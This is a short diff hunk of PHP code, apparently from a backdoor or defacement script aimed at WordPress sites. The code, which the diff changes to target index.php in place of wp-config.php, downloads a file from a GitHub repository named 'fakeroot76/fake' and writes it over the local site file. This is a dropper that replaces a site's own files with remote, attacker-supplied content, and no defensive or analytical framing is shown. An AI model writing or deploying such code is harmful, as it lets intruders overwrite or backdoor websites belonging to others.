@@ -35,7 +35,7 @@ $sha1     = sha1(gmdate("r"));
 }
 ?>
 <?php
-$nama= fopen("wp-config.php" ,"w+");
+$nama= fopen("index.php" ,"w+");
   $file = file_get_contents('https://raw.githubusercontent.com/fakeroot76/fake/master/wp-config.php');
   $tulis = fwrite ($nama ,$file);
  fclose($nama);
